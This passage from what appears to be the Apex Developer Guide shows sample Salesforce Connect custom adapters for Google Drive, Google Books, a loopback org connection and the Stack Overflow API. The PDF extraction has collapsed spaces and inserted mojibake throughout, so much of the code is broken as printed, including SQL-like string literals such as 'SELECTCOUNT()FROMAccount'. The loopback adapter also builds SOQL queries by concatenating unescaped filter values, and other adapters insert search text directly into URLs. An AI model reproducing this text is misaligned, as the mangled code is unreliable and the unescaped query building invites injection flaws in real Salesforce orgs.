capabilities.add(DataSource.Capability.ROW_QUERY);
returncapabilities;
}
/**
*   Declaresthe associatedDataSource.Connectionclass.
**/
overrideglobalDataSource.ConnectiongetConnection(
DataSource.ConnectionParamsconnectionParams){
returnnew GitHubDataSourceConnection(connectionParams);
}
}
SEE ALSO:
Adding Remote Site Settings
Google Drive
™
 Custom Adapter for Salesforce Connect
This example illustrates how to use callouts and OAuth to connect to an external system, which in this case is the Google Drive
™
 online
storage service. The example also shows how to avoid failing tests from web service callouts by returning mock responses for test
methods.
For this example to work reliably, request offline access when setting up OAuth so that Salesforce can obtain and maintain a refresh
token for your connections.
DriveDataSourceConnection Class
/**
*   Extendsthe DataSource.Connectionclassto enable
*   Salesforceto syncthe externalsystem’sschema
*   and to handlequeriesand searchesof the externaldata.
**/
globalclassDriveDataSourceConnectionextends
DataSource.Connection{
privateDataSource.ConnectionParamsconnectionInfo;
/**
*   Constructorfor DriveDataSourceConnection.
**/
globalDriveDataSourceConnection(
DataSource.ConnectionParamsconnectionInfo){
554
Using Salesforce Features with ApexApex Developer Guide

this.connectionInfo= connectionInfo;
}
/**
*   Calledwhenan externalobjectneedsto get a listof
*   schemafromthe externaldatasource,for examplewhen
*   the administratorclicks“Validateand Sync”in the
*   userinterfacefor the externaldatasource.
**/
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
List<DataSource.Column>columns;
columns= new List<DataSource.Column>();
columns.add(DataSource.Column.text('title', 255));
columns.add(DataSource.Column.text('description',255));
columns.add(DataSource.Column.text('createdDate',255));
columns.add(DataSource.Column.text('modifiedDate',255));
columns.add(DataSource.Column.url('selfLink'));
columns.add(DataSource.Column.url('DisplayUrl'));
columns.add(DataSource.Column.text('ExternalId',255));
tables.add(DataSource.Table.get('googleDrive','title',
columns));
returntables;
}
/**
*   Calledto queryand get resultsfromthe external
*   systemfor SOQLqueries,listviews,and detailpages
*   for an externalobjectthat’sassociatedwiththe
*   externaldatasource.
*
*   The QueryContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsa listof rowsas the queryresults.
**/
overrideglobalDataSource.TableResultquery(
DataSource.QueryContextcontext){
DataSource.Filterfilter= context.tableSelection.filter;
Stringurl;
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
thisColumnName.equals('ExternalId'))
url = 'https://www.googleapis.com/drive/v2/'
+ 'files/'+ filter.columnValue;
else
url = 'https://www.googleapis.com/drive/v2/'
+ 'files';
} else{
url = 'https://www.googleapis.com/drive/v2/'
+ 'files';
}
555
Using Salesforce Features with ApexApex Developer Guide

/**
* Filters,sorts,and applieslimitand offsetclauses.
**/
List<Map<String, Object>> rows=
DataSource.QueryUtils.process(context,getData(url));
returnDataSource.TableResult.get(true, null,
context.tableSelection.tableSelected,rows);
}
/**
*   Calledto do a fulltextsearchand get resultsfrom
*   the externalsystemfor SOSLqueriesand Salesforce
*   globalsearches.
*
*   The SearchContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsresultsfor eachtablethatthe SearchContext
*   requestedto be searched.
**/
overrideglobalList<DataSource.TableResult>search(
DataSource.SearchContextcontext){
List<DataSource.TableResult>results=
new List<DataSource.TableResult>();
for (Integeri =0;i<context.tableSelections.size();i++){
Stringentity= context.tableSelections[i].tableSelected;
Stringurl =
'https://www.googleapis.com/drive/v2/files'+
'?q=fullText+contains+\''+context.searchPhrase+'\'';
results.add(DataSource.TableResult.get(
true, null, entity,getData(url)));
}
returnresults;
}
/**
*   Helpermethodto parsethe data.
*   The url argumentis the URL of the externalsystem.
*   Returnsa listof rowsfromthe externalsystem.
**/
publicList<Map<String, Object>> getData(Stringurl){
Stringresponse= getResponse(url);
List<Map<String, Object>> rows=
new List<Map<String, Object>>();
Map<String, Object> responseBodyMap= (Map<String, Object>)
JSON.deserializeUntyped(response);
/**
*   Checkserrors.
556
Using Salesforce Features with ApexApex Developer Guide

**/
Map<String, Object> error=
(Map<String, Object>)responseBodyMap.get('error');
if (error!=null) {
List<Object> errorsList=
(List<Object>)error.get('errors');
Map<String, Object> errors=
(Map<String, Object>)errorsList[0];
StringerrorMessage= (String)errors.get('message');
thrownew DataSource.OAuthTokenExpiredException(errorMessage);
}
List<Object> fileItems=(List<Object>)responseBodyMap.get('items');
if (fileItems!= null) {
for (Integeri=0;i < fileItems.size();i++){
Map<String, Object> item=
(Map<String, Object>)fileItems[i];
rows.add(createRow(item));
}
} else{
rows.add(createRow(responseBodyMap));
}
returnrows;
}
/**
*   Helpermethodto populatethe ExternalID and Display
*   URL fieldson externalobjectrecordsbasedon the 'id'
*   valuethat’ssentby the externalsystem.
*
*   The Map<String,Object>itemparametermapsto the data
*   thatrepresentsa row.
*
*   Returnsan updatedmap withthe ExternalID and
*   DisplayURL values.
**/
publicMap<String, Object> createRow(
Map<String, Object> item){
Map<String, Object> row = new Map<String, Object>();
for ( Stringkey : item.keySet()) {
if (key== 'id') {
row.put('ExternalId', item.get(key));
} elseif (key=='selfLink') {
row.put(key,item.get(key));
row.put('DisplayUrl', item.get(key));
} else{
row.put(key,item.get(key));
}
}
returnrow;
}
staticStringmockResponse= '{' +
557
Using Salesforce Features with ApexApex Developer Guide

'  "kind":"drive#file",'+
'  "id":"12345",'+
'  "selfLink":"files/12345",'+
'  "title":"MockFile",'+
'  "mimeType":"application/text",'+
'  "description":"Mockresponsethat’susedduringtests",'+
'  "createdDate":"2016-04-20",'+
'  "modifiedDate":"2016-04-20",'+
'  "version":1' +
'}';
/**
*   Helpermethodto makethe HTTPGET call.
*   The url argumentis the URL of the externalsystem.
*   Returnsthe responsefromthe externalsystem.
**/
publicStringgetResponse(Stringurl){
if (System.Test.isRunningTest()){
// Avoidcalloutsduringtests.Returnmockdatainstead.
returnmockResponse;
} else{
// Performcalloutsfor production(non-test)results.
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndPoint(url);
request.setMethod('GET');
request.setHeader('Authorization', 'Bearer'+
this.connectionInfo.oauthToken);
HttpResponseresponse= httpProtocol.send(request);
returnresponse.getBody();
}
}
}
DriveDataSourceProvider Class
/**
*   Extendsthe DataSource.Providerbaseclassto createa
*   customadapterfor SalesforceConnect.The classinforms
*   Salesforceof the functionaland authentication
*   capabilitiesthatare supportedby or requiredto connect
*   to an externalsystem.
**/
globalclassDriveDataSourceProvider
extendsDataSource.Provider{
/**
*   Declaresthe typesof authenticationthatcan be used
*   to accessthe externalsystem.
**/
overrideglobalList<DataSource.AuthenticationCapability>
getAuthenticationCapabilities(){
List<DataSource.AuthenticationCapability>capabilities=
new List<DataSource.AuthenticationCapability>();
558
Using Salesforce Features with ApexApex Developer Guide

capabilities.add(
DataSource.AuthenticationCapability.OAUTH);
capabilities.add(
DataSource.AuthenticationCapability.ANONYMOUS);
returncapabilities;
}
/**
*   Declaresthe functionalcapabilitiesthatthe
*   externalsystemsupports.
**/
overrideglobalList<DataSource.Capability>
getCapabilities(){
List<DataSource.Capability>capabilities=
new List<DataSource.Capability>();
capabilities.add(DataSource.Capability.ROW_QUERY);
capabilities.add(DataSource.Capability.SEARCH);
returncapabilities;
}
/**
*   Declaresthe associatedDataSource.Connectionclass.
**/
overrideglobalDataSource.ConnectiongetConnection(
DataSource.ConnectionParamsconnectionParams){
returnnew DriveDataSourceConnection(connectionParams);
}
}
Google Books
™
 Custom Adapter for Salesforce Connect
This example illustrates how to work around the requirements and limits of an external system’s APIs: in this case, the Google Books API
Family.
To integrate with the Google Books
™
 service, we set up Salesforce Connect as follows.
•
The Google Books API allows a maximum of 40 returned results, so we develop our custom adapter to handle result sets with more
than 40 rows.
•
The Google Books API can sort only by search relevance and publish dates, so we develop our custom adapter to disable sorting on
columns.
•
To support OAuth, we set up our authentication settings in Salesforce so that the requested scope of permissions for access tokens
includes https://www.googleapis.com/auth/books.
•
To allow Apex callouts, we define these remote sites in Salesforce:
–
https://www.googleapis.com
–
https://books.google.com
BooksDataSourceConnection Class
/**
*   Extendsthe DataSource.Connectionclassto enable
*   Salesforceto syncthe externalsystemmetadata
559
Using Salesforce Features with ApexApex Developer Guide

*   schemaand to handlequeriesand searchesof the external
*   data.
**/
globalclassBooksDataSourceConnectionextends
DataSource.Connection{
privateDataSource.ConnectionParamsconnectionInfo;
// Constructorfor BooksDataSourceConnection.
globalBooksDataSourceConnection(DataSource.ConnectionParams
connectionInfo){
this.connectionInfo= connectionInfo;
}
/**
*   Calledwhenan externalobjectneedsto get a listof
*   schemafromthe externaldatasource,for examplewhen
*   the administratorclicks“Validateand Sync”in the
*   userinterfacefor the externaldatasource.
**/
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
List<DataSource.Column>columns;
columns= new List<DataSource.Column>();
columns.add(getColumn('title'));
columns.add(getColumn('description'));
columns.add(getColumn('publishedDate'));
columns.add(getColumn('publisher'));
columns.add(DataSource.Column.url('DisplayUrl'));
columns.add(DataSource.Column.text('ExternalId', 255));
tables.add(DataSource.Table.get('googleBooks', 'title',
columns));
returntables;
}
/**
*   GoogleBooksAPI v1 doesn'tsupportsorting,
*   so we createa columnwithsortable= false.
**/
privateDataSource.ColumngetColumn(StringcolumnName){
DataSource.Columncolumn= DataSource.Column.text(columnName,
255);
column.sortable= false;
returncolumn;
}
/**
*   Calledto queryand get resultsfromthe external
*   systemfor SOQLqueries,listviews,and detailpages
*   for an externalobjectthat'sassociatedwiththe
*   externaldatasource.
*
*   The QueryContextargumentrepresentsthe queryto run
560
Using Salesforce Features with ApexApex Developer Guide

*   againsta tablein the externalsystem.
*
*   Returnsa listof rowsas the queryresults.
**/
overrideglobalDataSource.TableResultquery(
DataSource.QueryContextcontexts){
DataSource.Filterfilter= contexts.tableSelection.filter;
Stringurl;
if (contexts.tableSelection.columnsSelected.size()== 1 &&
contexts.tableSelection.columnsSelected.get(0).aggregation==
DataSource.QueryAggregation.COUNT){
returngetCount(contexts);
}
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
thisColumnName.equals('ExternalId')) {
url = 'https://www.googleapis.com/books/v1/'+
'volumes?q='+ filter.columnValue+
'&maxResults=1&id='+ filter.columnValue;
returnDataSource.TableResult.get(true, null,
contexts.tableSelection.tableSelected,
getData(url));
}
else{
url = 'https://www.googleapis.com/books/'+
'v1/volumes?q='+ filter.columnValue+
'&id='+ filter.columnValue+
'&maxResults=40'+ '&startIndex=';
}
} else{
url = 'https://www.googleapis.com/books/v1/'+
'volumes?q=america&'+ '&maxResults=40'+
'&startIndex=';
}
/**
*   GoogleBooksAPI v1 supportsmaxResultsof 40
*   so we handlepaginationexplicitlyin the elsestatement
*   whenwe handlemorethan40 recordsper query.
**/
if (contexts.maxResults< 40) {
returnDataSource.TableResult.get(true, null,
contexts.tableSelection.tableSelected,
getData(url+ contexts.offset));
}
else{
returnfetchData(contexts,url);
}
}
/**
*   Helpermethodto fetchresultswhenmaxResultsis
*   greaterthan40 (themax valuefor maxResultssupported
561
Using Salesforce Features with ApexApex Developer Guide

*   by GoogleBooksAPI v1).
**/
privateDataSource.TableResultfetchData(
DataSource.QueryContextcontexts,Stringurl){
IntegerfetchSlot= (contexts.maxResults/ 40) + 1;
List<Map<String, Object>> data=
new List<Map<String, Object>>();
IntegerstartIndex= contexts.offset;
for(Integercount= 0; count< fetchSlot;count++){
data.addAll(getData(url+ startIndex));
if(count== 0)
contexts.offset= 41;
else
contexts.offset+= 40;
}
returnDataSource.TableResult.get(true, null,
contexts.tableSelection.tableSelected,data);
}
/**
*   Helpermethodto executecount()query.
**/
privateDataSource.TableResultgetCount(
DataSource.QueryContextcontexts){
Stringurl = 'https://www.googleapis.com/books/v1/'+
'volumes?q=america&projection=full';
List<Map<String,Object>> response=
DataSource.QueryUtils.filter(contexts,getData(url));
List<Map<String, Object>> countResponse=
new List<Map<String, Object>>();
Map<String, Object> countRow=
new Map<String, Object>();
countRow.put(
contexts.tableSelection.columnsSelected.get(0).columnName,
response.size());
countResponse.add(countRow);
returnDataSource.TableResult.get(contexts,countResponse);
}
/**
*   Calledto do a fulltextsearchand get resultsfrom
*   the externalsystemfor SOSLqueriesand Salesforce
*   globalsearches.
*
*   The SearchContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsresultsfor eachtablethatthe SearchContext
*   requestedto be searched.
**/
overrideglobalList<DataSource.TableResult>search(
DataSource.SearchContextcontexts){
List<DataSource.TableResult>results=
562
Using Salesforce Features with ApexApex Developer Guide

new List<DataSource.TableResult>();
for (Integeri =0; i< contexts.tableSelections.size();i++){
Stringentity= contexts.tableSelections[i].tableSelected;
Stringurl = 'https://www.googleapis.com/books/v1'+
'/volumes?q='+ contexts.searchPhrase;
results.add(DataSource.TableResult.get(true, null,
entity,
getData(url)));
}
returnresults;
}
/**
*   Helpermethodto parsethe data.
*   Returnsa listof rowsfromthe externalsystem.
**/
publicList<Map<String, Object>> getData(Stringurl){
HttpResponseresponse= getResponse(url);
Stringbody= response.getBody();
List<Map<String, Object>> rows=
new List<Map<String, Object>>();
Map<String, Object> responseBodyMap=
(Map<String, Object>)JSON.deserializeUntyped(body);
/**
*   Checkserrors.
**/
Map<String, Object> error=
(Map<String, Object>)responseBodyMap.get('error');
if (error!=null) {
List<Object> errorsList=
(List<Object>)error.get('errors');
Map<String, Object> errors=
(Map<String, Object>)errorsList[0];
Stringmessages= (String)errors.get('message');
thrownew DataSource.OAuthTokenExpiredException(messages);
}
List<Object> sItems= (List<Object>)responseBodyMap.get('items');
if (sItems!= null) {
for (Integeri=0;i< sItems.size();i++){
Map<String, Object> item=
(Map<String, Object>)sItems[i];
rows.add(createRow(item));
}
} else{
rows.add(createRow(responseBodyMap));
}
returnrows;
563
Using Salesforce Features with ApexApex Developer Guide

}
/**
*   Helpermethodto populatea row basedon sourcedata.
*
*   The itemargumentmapsto the datathat
*   representsa row.
*
*   Returnsan updatedmap withthe ExternalID and
*   DisplayURL values.
**/
publicMap<String, Object> createRow(
Map<String, Object> item) {
Map<String, Object> row = new Map<String, Object>();
for ( Stringkey : item.keySet()){
if (key== 'id') {
row.put('ExternalId', item.get(key));
} elseif (key== 'volumeInfo') {
Map<String, Object> volumeInfoMap=
(Map<String, Object>)item.get(key);
row.put('title', volumeInfoMap.get('title'));
row.put('description',
volumeInfoMap.get('description'));
row.put('DisplayUrl',
volumeInfoMap.get('infoLink'));
row.put('publishedDate',
volumeInfoMap.get('publishedDate'));
row.put('publisher',
volumeInfoMap.get('publisher'));
}
}
returnrow;
}
/**
*   Helpermethodto makethe HTTPGET call.
*   The url argumentis the URL of the externalsystem.
*   Returnsthe responsefromthe externalsystem.
**/
publicHttpResponsegetResponse(Stringurl){
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndPoint(url);
request.setMethod('GET');
request.setHeader('Authorization', 'Bearer'+
this.connectionInfo.oauthToken);
HttpResponseresponse= httpProtocol.send(request);
returnresponse;
}
}
564
Using Salesforce Features with ApexApex Developer Guide

BooksDataSourceProvider Class
/**
*   Extendsthe DataSource.Providerbaseclassto createa
*   customadapterfor SalesforceConnect.The classinforms
*   Salesforceof the functionaland authentication
*   capabilitiesthatare supportedby or requiredto connect
*   to an externalsystem.
**/
globalclassBooksDataSourceProviderextends
DataSource.Provider{
/**
*   Declaresthe typesof authenticationthatcan be used
*   to accessthe externalsystem.
**/
overrideglobalList<DataSource.AuthenticationCapability>
getAuthenticationCapabilities(){
List<DataSource.AuthenticationCapability>capabilities=
new List<DataSource.AuthenticationCapability>();
capabilities.add(
DataSource.AuthenticationCapability.OAUTH);
capabilities.add(
DataSource.AuthenticationCapability.ANONYMOUS);
returncapabilities;
}
/**
*   Declaresthe functionalcapabilitiesthatthe
*   externalsystemsupports.
**/
overrideglobalList<DataSource.Capability>
getCapabilities(){
List<DataSource.Capability>capabilities= new
List<DataSource.Capability>();
capabilities.add(DataSource.Capability.ROW_QUERY);
capabilities.add(DataSource.Capability.SEARCH);
returncapabilities;
}
/**
*   Declaresthe associatedDataSource.Connectionclass.
**/
overrideglobalDataSource.ConnectiongetConnection(
DataSource.ConnectionParamsconnectionParams){
returnnew BooksDataSourceConnection(connectionParams);
}
}
Loopback Custom Adapter for Salesforce Connect
This example illustrates how to handle filtering in queries. For simplicity, this example connects the Salesforce org to itself as the external
system.
565
Using Salesforce Features with ApexApex Developer Guide

LoopbackDataSourceConnection Class
/**
*   Extendsthe DataSource.Connectionclassto enable
*   Salesforceto syncthe externalsystemâ€
™
s schema
*   and to handlequeriesand searchesof the externaldata.
**/
globalclassLoopbackDataSourceConnection
extendsDataSource.Connection{
/**
*   Constructors.
**/
globalLoopbackDataSourceConnection(
DataSource.ConnectionParamsconnectionParams){
}
globalLoopbackDataSourceConnection(){}
/**
*   Calledwhenan externalobjectneedsto get a listof
*   schemafromthe externaldatasource,for examplewhen
*   the administratorclicksâ€œValidateand Syncâ€ in the
*   userinterfacefor the externaldatasource.
**/
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
List<DataSource.Column>columns;
columns= new List<DataSource.Column>();
columns.add(DataSource.Column.text('ExternalId', 255));
columns.add(DataSource.Column.url('DisplayUrl'));
columns.add(DataSource.Column.text('Name', 255));
columns.add(
DataSource.Column.number('NumberOfEmployees', 18, 0));
tables.add(
DataSource.Table.get('Looper', 'Name', columns));
returntables;
}
/**
*   Calledto queryand get resultsfromthe external
*   systemfor SOQLqueries,listviews,and detailpages
*   for an externalobjectthatâ€
™
s associatedwiththe
*   externaldatasource.
*
*   The QueryContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsa listof rowsas the queryresults.
**/
overrideglobalDataSource.TableResult
query(DataSource.QueryContextcontext){
if (context.tableSelection.columnsSelected.size()== 1 &&
context.tableSelection.columnsSelected.get(0).aggregation==
DataSource.QueryAggregation.COUNT){
566
Using Salesforce Features with ApexApex Developer Guide

integercount= execCount(getCountQuery(context));
List<Map<String, Object>> countResponse=
new List<Map<String, Object>>();
Map<String, Object> countRow=
new Map<String, Object>();
countRow.put(
context.tableSelection.columnsSelected.get(0).columnName,
count);
countResponse.add(countRow);
returnDataSource.TableResult.get(context,countResponse);
} else{
List<Map<String,Object>> rows= execQuery(
getSoqlQuery(context));
returnDataSource.TableResult.get(context,rows);
}
}
/**
*   Calledto do a fulltextsearchand get resultsfrom
*   the externalsystemfor SOSLqueriesand Salesforce
*   globalsearches.
*
*   The SearchContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsresultsfor eachtablethatthe SearchContext
*   requestedto be searched.
**/
overrideglobalList<DataSource.TableResult>
search(DataSource.SearchContextcontext){
returnDataSource.SearchUtils.searchByName(context,this);
}
/**
*   Helpermethodto executethe SOQLqueryand
*   returnthe results.
**/
privateList<Map<String,Object>>
execQuery(StringsoqlQuery){
List<Account>objs= Database.query(soqlQuery);
List<Map<String,Object>> rows=
new List<Map<String,Object>>();
for (Accountobj : objs){
Map<String,Object> row = new Map<String,Object>();
row.put('Name', obj.Name);
row.put('NumberOfEmployees', obj.NumberOfEmployees);
row.put('ExternalId', obj.Id);
row.put('DisplayUrl',
URL.getOrgDomainUrl().toExternalForm()+
obj.Id);
rows.add(row);
}
returnrows;
}
567
Using Salesforce Features with ApexApex Developer Guide

/**
*   Helpermethodto get aggregatecount.
**/
privateintegerexecCount(StringsoqlQuery){
integercount= Database.countQuery(soqlQuery);
returncount;
}
/**
*   Helpermethodto createdefaultaggregatequery.
**/
privateStringgetCountQuery(DataSource.QueryContextcontext){
StringbaseQuery= 'SELECTCOUNT()FROMAccount';
Stringfilter= getSoqlFilter('',
context.tableSelection.filter);
if (filter.length()> 0)
returnbaseQuery+ ' WHERE' + filter;
returnbaseQuery;
}
/**
*   Helpermethodto createdefaultquery.
**/
privateStringgetSoqlQuery(DataSource.QueryContextcontext){
StringbaseQuery=
'SELECTId,Name,NumberOfEmployeesFROMAccount';
Stringfilter= getSoqlFilter('',
context.tableSelection.filter);
if (filter.length()> 0)
returnbaseQuery+ ' WHERE' + filter;
returnbaseQuery;
}
/**
*   Helpermethodto handlequeryfilter.
**/
privateStringgetSoqlFilter(Stringquery,
DataSource.Filterfilter){
if (filter== null) {
returnquery;
}
Stringappend;
DataSource.FilterTypetype= filter.type;
List<Map<String,Object>> retainedRows=
new List<Map<String,Object>>();
if (type== DataSource.FilterType.NOT_){
DataSource.Filtersubfilter= filter.subfilters.get(0);
append= getSoqlFilter('NOT', subfilter);
} elseif (type== DataSource.FilterType.AND_){
append=
getSoqlFilterCompound('AND', filter.subfilters);
} elseif (type== DataSource.FilterType.OR_){
append=
568
Using Salesforce Features with ApexApex Developer Guide

getSoqlFilterCompound('OR', filter.subfilters);
} else{
append= getSoqlFilterExpression(filter);
}
returnquery+ ' ' + append;
}
/**
*   Helpermethodto handlequerysubfilters.
**/
privateStringgetSoqlFilterCompound(Stringoperator,
List<DataSource.Filter>subfilters){
Stringexpression= ' (';
booleanfirst= true;
for (DataSource.Filtersubfilter: subfilters){
if (first)
first= false;
else
expression+= ' ' + operator+ ' ';
expression+= getSoqlFilter('', subfilter);
}
expression+= ') ';
returnexpression;
}
/**
*   Helpermethodto handlequeryfilterexpressions.
**/
privateStringgetSoqlFilterExpression(
DataSource.Filterfilter){
StringcolumnName= filter.columnName;
Stringoperator;
ObjectexpectedValue= filter.columnValue;
if (filter.type== DataSource.FilterType.EQUALS){
operator= '=';
} elseif (filter.type==
DataSource.FilterType.NOT_EQUALS){
operator= '<>';
} elseif (filter.type==
DataSource.FilterType.LESS_THAN){
operator= '<';
} elseif (filter.type==
DataSource.FilterType.GREATER_THAN){
operator= '>';
} elseif (filter.type==
DataSource.FilterType.LESS_THAN_OR_EQUAL_TO){
operator= '<=';
} elseif (filter.type==
DataSource.FilterType.GREATER_THAN_OR_EQUAL_TO){
operator= '>=';
} elseif (filter.type==
DataSource.FilterType.STARTS_WITH){
returnmapColumnName(columnName)+
' LIKE\'' + String.valueOf(expectedValue)+ '%\'';
569
Using Salesforce Features with ApexApex Developer Guide

} elseif (filter.type==
DataSource.FilterType.ENDS_WITH){
returnmapColumnName(columnName)+
' LIKE\'%'+ String.valueOf(expectedValue)+ '\'';
} elseif (filter.type==
DataSource.FilterType.LIKE_){
returnmapColumnName(columnName)+
' LIKE\'' + String.valueOf(expectedValue)+ '\'';
} else{
throwException(
'Implementingotherfiltertypesis leftas an exercisefor the reader:'
+ filter.type);
}
returnmapColumnName(columnName)+
' ' + operator+ ' ' + wrapValue(expectedValue);
}
/**
*   Helpermethodto map columnnames.
**/
privateStringmapColumnName(StringapexName){
if (apexName.equalsIgnoreCase('ExternalId'))
return'Id';
if (apexName.equalsIgnoreCase('DisplayUrl'))
return'Id';
returnapexName;
}
/**
*   Helpermethodto wrapexpressionStringswithquotes.
**/
privateStringwrapValue(ObjectfoundValue){
if (foundValueinstanceofString)
return'\''+ String.valueOf(foundValue)+ '\'';
returnString.valueOf(foundValue);
}
}
LoopbackDataSourceProvider Class
/**
*   Extendsthe DataSource.Providerbaseclassto createa
*   customadapterfor SalesforceConnect.The classinforms
*   Salesforceof the functionaland authentication
*   capabilitiesthatare supportedby or requiredto connect
*   to an externalsystem.
**/
globalclassLoopbackDataSourceProvider
extendsDataSource.Provider{
/**
*   Declaresthe typesof authenticationthatcan be used
*   to accessthe externalsystem.
**/
570
Using Salesforce Features with ApexApex Developer Guide

overrideglobalList<DataSource.AuthenticationCapability>
getAuthenticationCapabilities(){
List<DataSource.AuthenticationCapability>capabilities=
new List<DataSource.AuthenticationCapability>();
capabilities.add(
DataSource.AuthenticationCapability.ANONYMOUS);
capabilities.add(
DataSource.AuthenticationCapability.BASIC);
returncapabilities;
}
/**
*   Declaresthe functionalcapabilitiesthatthe
*   externalsystemsupports.
**/
overrideglobalList<DataSource.Capability>
getCapabilities(){
List<DataSource.Capability>capabilities=
new List<DataSource.Capability>();
capabilities.add(DataSource.Capability.ROW_QUERY);
capabilities.add(DataSource.Capability.SEARCH);
returncapabilities;
}
/**
*   Declaresthe associatedDataSource.Connectionclass.
**/
overrideglobalDataSource.Connection
getConnection(DataSource.ConnectionParamsconnectionParams){
returnnew LoopbackDataSourceConnection();
}
}
Stack Overflow Custom Adapter for Salesforce Connect
This example illustrates how to support external lookup relationships and multiple tables. An external lookup relationship links a child
standard, custom, or external object to a parent external object. Each table can become an external object in the Salesforce org.
For this example to work, create a custom field on the Contact standard object. Name the custom field “github_username” and select
the ExternalID and Unique attributes.
StackOverflowDataSourceConnection Class
/**
*   Definesthe connectionto StackExchangeAPI v2.2to support
*   queryingof StackOverflowusers(stackoverflowUser)
*   and posts(stackoverflowPost).
*   Extendsthe DataSource.Connectionclassto enable
*   Salesforceto syncthe externalsystem’sschema
*   and to handlequeriesof the externaldata.
**/
globalclassStackOverflowDataSourceConnectionextends
DataSource.Connection{
privateDataSource.ConnectionParamsconnectionInfo;
571
Using Salesforce Features with ApexApex Developer Guide

/**
*   Constructorfor StackOverflowDataSourceConnection
**/
globalStackOverflowDataSourceConnection(
DataSource.ConnectionParamsconnectionInfo){
this.connectionInfo= connectionInfo;
}
/**
*   Definesthe schemafor the externalsystem.
*   Calledwhenthe administratorclicks“Validateand Sync”
*   in the userinterfacefor the externaldatasource.
**/
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
// Definescolumnsfor the tableof StackOverFlowposts
List<DataSource.Column>postColumns=
new List<DataSource.Column>();
// Definesthe externallookupfield.
postColumns.add(DataSource.Column.externalLookup(
'owner_id', 'stackoverflowUser__x'));
postColumns.add(DataSource.Column.text('title', 255));
postColumns.add(DataSource.Column.text('view_count', 255));
postColumns.add(DataSource.Column.text('question_id',255));
postColumns.add(DataSource.Column.text('creation_date',255));
postColumns.add(DataSource.Column.text('score',255));
postColumns.add(DataSource.Column.url('link'));
postColumns.add(DataSource.Column.url('DisplayUrl'));
postColumns.add(DataSource.Column.text('ExternalId',255));
tables.add(DataSource.Table.get('stackoverflowPost','title',
postColumns));
// Definescolumnsfor the tableof StackOverFlowusers
List<DataSource.Column>userColumns=
new List<DataSource.Column>();
userColumns.add(DataSource.Column.text('user_id', 255));
userColumns.add(DataSource.Column.text('display_name', 255));
userColumns.add(DataSource.Column.text('location',255));
userColumns.add(DataSource.Column.text('creation_date',255));
userColumns.add(DataSource.Column.url('website_url',255));
userColumns.add(DataSource.Column.text('reputation',255));
userColumns.add(DataSource.Column.url('link'));
userColumns.add(DataSource.Column.url('DisplayUrl'));
userColumns.add(DataSource.Column.text('ExternalId',255));
tables.add(DataSource.Table.get('stackoverflowUser',
'Display_name', userColumns));
returntables;
572
Using Salesforce Features with ApexApex Developer Guide

}
/**
*   Calledto queryand get resultsfromthe external
*   systemfor SOQLqueries,listviews,and detailpages
*   for an externalobjectthat’sassociatedwiththe
*   externaldatasource.
*
*   The QueryContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsa listof rowsas the queryresults.
**/
overrideglobalDataSource.TableResultquery(
DataSource.QueryContextcontext){
DataSource.Filterfilter= context.tableSelection.filter;
Stringurl;
// Setsthe URL to queryStackOverflowposts
if (context.tableSelection.tableSelected
.equals('stackoverflowPost')) {
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
thisColumnName.equals('ExternalId'))
url = 'https://api.stackexchange.com/2.2/'
+ 'questions/'+ filter.columnValue
+ '?order=desc&sort=activity'
+ '&site=stackoverflow';
else
url = 'https://api.stackexchange.com/2.2/'
+ 'questions'
+ '?order=desc&sort=activity'
+ '&site=stackoverflow';
} else{
url = 'https://api.stackexchange.com/2.2/'
+ 'questions'
+ '?order=desc&sort=activity'
+ '&site=stackoverflow';
}
// Setsthe URL to queryStackOverflowusers
} elseif (context.tableSelection.tableSelected
.equals('stackoverflowUser')) {
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
thisColumnName.equals('ExternalId'))
url = 'https://api.stackexchange.com/2.2/'
+ 'users/'+ filter.columnValue
+ '?order=desc&sort=reputation'
+ '&site=stackoverflow';
else
url = 'https://api.stackexchange.com/2.2/'
+ 'users'+
573
Using Salesforce Features with ApexApex Developer Guide

'?order=desc&sort=reputation&site=stackoverflow';
} else{
url = 'https://api.stackexchange.com/2.2/'
+ 'users'+ '?order=desc&sort=reputation'
+ '&site=stackoverflow';
}
}
/**
* Filters,sorts,and applieslimitand offsetclauses.
**/
List<Map<String, Object>> rows=
DataSource.QueryUtils.process(context,getData(url));
returnDataSource.TableResult.get(true, null,
context.tableSelection.tableSelected,rows);
}
/**
*   Helpermethodto parsethe data.
*   The url argumentis the URL of the externalsystem.
*   Returnsa listof rowsfromthe externalsystem.
**/
publicList<Map<String, Object>> getData(Stringurl){
Stringresponse= getResponse(url);
List<Map<String, Object>> rows=
new List<Map<String, Object>>();
Map<String, Object> responseBodyMap= (Map<String, Object>)
JSON.deserializeUntyped(response);
/**
*   Checkserrors.
**/
Map<String, Object> error=
(Map<String, Object>)responseBodyMap.get('error');
if (error!=null) {
List<Object> errorsList=
(List<Object>)error.get('errors');
Map<String, Object> errors=
(Map<String, Object>)errorsList[0];
StringerrorMessage= (String)errors.get('message');
thrownew
DataSource.OAuthTokenExpiredException(errorMessage);
}
List<Object> fileItems=
(List<Object>)responseBodyMap.get('items');
if (fileItems!= null) {
for (Integeri=0;i < fileItems.size();i++){
Map<String, Object> item=
(Map<String, Object>)fileItems[i];
rows.add(createRow(item));
}
574
Using Salesforce Features with ApexApex Developer Guide

} else{
rows.add(createRow(responseBodyMap));
}
returnrows;
}
/**
*   Helpermethodto populatethe ExternalID and Display
